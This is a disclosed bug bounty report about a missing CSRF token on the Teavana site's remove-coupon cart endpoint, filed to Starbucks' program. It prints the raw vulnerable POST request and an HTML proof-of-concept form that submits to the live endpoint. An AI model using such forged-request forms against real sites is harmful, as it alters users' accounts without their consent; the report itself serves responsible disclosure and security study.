# Missing CSRF Token On Remove Coupun From Cart

## Report Details
- **Report ID**: 227726
- **URL**: https://hackerone.com/reports/227726
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-05-11T16:03:57.693Z
- **Disclosed**: 2019-02-08T19:05:20.751Z

## Reporter
- **Username**: apapedulimu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
Hi,
When remove coupun, there's no CSRF token, at this time i use `███████` Coupun to reproduce it.

__Vuln Request__
```
POST /on/demandware.store/Sites-Teavana-Site/default/Cart-RemoveCoupon HTTP/1.1
Host: www.teavana.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://www.teavana.com/us/en/cart
Content-Length: 17
Cookie: some cookie
Connection: close

couponCode=██████████
```

__Poc Code__
```
<html>
<body>
<form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Cart-RemoveCoupon" method="POST">
<input type="hidden" name="couponCode" value="███" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>

```

Edit the `coupunCode` with name of the coupun.

Thanks, 
 If you need video, i will create one !

## Attachments
No attachments
